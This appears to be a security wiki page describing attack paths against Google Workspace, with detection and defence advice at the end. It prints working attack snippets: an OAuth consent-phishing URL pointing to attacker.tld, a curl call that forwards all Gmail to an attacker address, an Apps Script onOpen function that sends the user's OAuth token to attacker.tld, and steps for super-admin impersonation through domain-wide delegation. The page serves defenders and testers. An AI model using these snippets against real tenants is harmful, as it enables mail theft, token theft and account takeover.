---
title: Google Workspace Attack Paths — Consent Phishing to Domain-Wide Delegation
slug: google-workspace-attacks
---

> **TL;DR:** Google Workspace tenants fall to OAuth consent phishing, persistent Gmail forwarding rules, weaponised Apps Script, and super-admin takeover through abused domain-wide delegation.

## What it is
Workspace combines Gmail, Drive, Calendar, and an IAM model that lets service accounts impersonate any user via domain-wide delegation (DWD). The 2020 SolarWinds wave, the 2023 Storm-0558 token-forgery campaign analogue, and ongoing illicit-consent-grant phishing against M&A targets all leverage Workspace's OAuth surface plus Apps Script for persistence.

## Preconditions / where it applies
- Workspace tenant without "Trust internal, block external" OAuth app controls
- User able to install marketplace apps or grant third-party OAuth scopes
- Super-admin with permission to add service-account DWD scopes
- Gmail with user-level filter creation enabled

## Technique
Illicit consent grant — register a Google Cloud OAuth client, request `gmail.readonly` + `drive.readonly`, send a phishing link:

```bash
# Consent URL the victim clicks
https://accounts.google.com/o/oauth2/v2/auth?\
client_id=$CID&redirect_uri=https://attacker.tld/cb&response_type=code&\
scope=https://www.googleapis.com/auth/gmail.readonly%20\
https://www.googleapis.com/auth/drive.readonly&access_type=offline&prompt=consent
```

After consent, exchange the code for a refresh token and read mail indefinitely (until the user revokes).

Mail-forwarding rule persistence:

```bash
# Gmail API: add a filter that forwards everything to attacker
curl -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -X POST "https://gmail.googleapis.com/gmail/v1/users/me/settings/filters" \
  -d '{"criteria":{"from":"*"},"action":{"forward":"x@attacker.tld"}}'
```

Drive sharing abuse — share sensitive folders to `anyone-with-link` or to an attacker-controlled external Workspace, then revoke the victim's notification via API.

Apps Script as malware — bind a script to a shared Sheet; the script runs as the opener's identity and can call any Workspace API the user has access to:

```javascript
function onOpen() {
  var token = ScriptApp.getOAuthToken();
  UrlFetchApp.fetch("https://attacker.tld/x?t=" + token);
}
```

Super-admin takeover via DWD — a compromised GCP service account with DWD and `https://www.googleapis.com/auth/admin.directory.user` scope can impersonate the super-admin and create new admins:

```bash
gcloud auth activate-service-account --key-file=sa.json
# Use google-auth library to mint a JWT with sub=superadmin@target.tld
```

## Detection and defence
- Set OAuth app access to "Trusted apps only"; require admin approval for sensitive scopes
- Monitor Admin Console audit log for `AUTHORIZE_API_CLIENT_ACCESS` (new DWD scopes) and `CHANGE_USER_FORWARDING`
- Disable end-user installation of marketplace apps; review Apps Script project grants quarterly
- Alert on Gmail filter creations with external forwarding addresses; block auto-forwarding org-wide where possible
- Enforce hardware-key 2SV for all admins and DWD-capable service accounts; rotate SA keys to short-lived workload-identity federation

## References
- [Workspace OAuth app verification](https://support.google.com/cloud/answer/9110914) — scope review process
- [Mandiant DWD abuse writeup](https://cloud.google.com/blog/topics/threat-intelligence) — DWD impersonation tradecraft

See also: [[entra-id-enum]], [[app-registration-abuse]], [[ci-cd-as-cloud-attack-surface]].
